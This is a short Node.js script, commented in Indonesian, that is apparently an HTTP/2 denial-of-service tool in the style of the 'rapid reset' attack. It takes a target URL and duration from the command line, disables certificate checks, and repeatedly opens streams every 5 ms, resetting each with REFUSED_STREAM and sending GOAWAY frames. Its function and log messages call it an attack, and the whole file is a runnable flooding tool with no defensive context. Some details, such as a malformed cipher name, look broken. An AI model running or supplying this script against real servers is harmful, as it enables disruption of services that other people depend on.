const http2 = require('http2');
const tls = require('tls');
const { createSecureContext } = require('crypto');
const { setTimeout } = require('timers/promises');

// Konfigurasi SSL menggunakan crypto
const sslOptions = {
    secureContext: createSecureContext({
        ciphers: [
            'TLS_AES_256_GCM_SHA384',
            'TLS_AES_128_GCM_SHA256',
            'ECDHE-RSA-AES256-GCM-SHA384',
            'ECDHE-RSA-AES128-GCM_SHA256',
        ].join(':'),
        sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256',
        minVersion: 'TLSv1.2',
        maxVersion: 'TLSv1.3',
    }),
    ALPNProtocols: ['h2'], // Mendukung protokol HTTP/2
    rejectUnauthorized: false, // Abaikan sertifikat yang tidak valid
};

// Fungsi utama untuk menjalankan pengujian
async function performAttack(targetUrl, duration) {
    const url = new URL(targetUrl);

    const client = http2.connect(url.origin, {
        createConnection: () => tls.connect({ ...sslOptions, host: url.hostname, port: 443 }),
    });

    client.on('error', (err) => console.error('Client error:', err.message));

    const startTime = Date.now();
    const endTime = startTime + duration * 1000;

    console.log(`Starting attack on ${targetUrl} for ${duration} seconds...`);

    while (Date.now() < endTime) {
        try {
            // Membuka stream baru
            const stream = client.request({ ':path': url.pathname });

            stream.on('response', (headers) => {
                // Reset stream dengan REFUSED_STREAM
                stream.close(http2.constants.NGHTTP2_REFUSED_STREAM);
            });

            stream.on('error', (err) => {
                console.error('Stream error:', err.message);
            });

            // Mengirimkan GOAWAY ke server
            client.goaway(http2.constants.NGHTTP2_NO_ERROR);
        } catch (err) {
            console.error('Error during attack:', err.message);
        }

        // Rush: Interval cepat antar permintaan
        await setTimeout(5); // 5ms delay
    }

    // Menutup koneksi HTTP/2
    client.close();
    console.log('Attack finished.');
}

// Parsing argumen dari command line
const args = process.argv.slice(2);
if (args.length < 2) {
    console.error('Usage: node goaway-rush-rst-crypto.js <url> <duration>');
    process.exit(1);
}

const [targetUrl, duration] = args;

// Memulai serangan
performAttack(targetUrl, parseInt(duration, 10));
